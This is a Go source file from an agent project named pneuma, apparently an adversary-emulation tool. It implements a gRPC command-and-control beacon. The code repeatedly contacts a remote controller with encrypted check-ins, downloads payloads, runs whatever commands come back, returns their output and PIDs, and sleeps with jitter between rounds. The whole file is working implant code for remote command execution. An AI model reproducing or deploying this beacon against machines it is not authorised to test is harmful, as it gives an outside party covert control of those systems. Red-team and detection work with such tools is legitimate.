package sockets

import (
	"context"
	"encoding/json"
	"github.com/preludeorg/pneuma/commands"
	"github.com/preludeorg/pneuma/util"
	"log"
	"strings"
	"time"

	pb "github.com/preludeorg/pneuma/sockets/protos"
	"google.golang.org/grpc"
)

type GRPC struct {}

func init() {
	CommunicationChannels["grpc"] = GRPC{}
}

func (contact GRPC) Communicate(agent *util.AgentConfig, beacon Beacon) {
	for {
		beacon.Links = beacon.Links[:0]
		for {
			body := beaconSend(agent.Address, beacon)
			var tempB Beacon
			json.Unmarshal(body, &tempB)
			if(len(tempB.Links)) == 0 {
				break
			}
			for _, link := range tempB.Links {
				var payloadPath string
				if len(link.Payload) > 0 {
					payloadPath = requestPayload(link.Payload)
				}
				response, status, pid := commands.RunCommand(link.Request, link.Executor, payloadPath, agent)
				link.Response = strings.TrimSpace(response)
				link.Status = status
				link.Pid = pid
				beacon.Links = append(beacon.Links, link)
			}
		}
		jitterSleep(agent.Sleep, "GRPC")
	}
}

func beaconSend(address string, beacon Beacon) []byte {
	conn, err := grpc.Dial(address, grpc.WithInsecure())
	if err != nil {
		log.Fatalf("[-] %s is either unavailable or a firewall is blocking traffic.", address)
	}
	defer conn.Close()
	c := pb.NewBeaconClient(conn)

	ctx, cancel := context.WithTimeout(context.Background(), time.Second)
	defer cancel()

	data, _ := json.Marshal(beacon)
	r, err := c.Handle(ctx, &pb.BeaconIncoming{Beacon: string(util.Encrypt(data))})
	if err != nil {
		return nil //no instructions for me
	}
	return []byte(util.Decrypt(r.GetBeacon()))
}
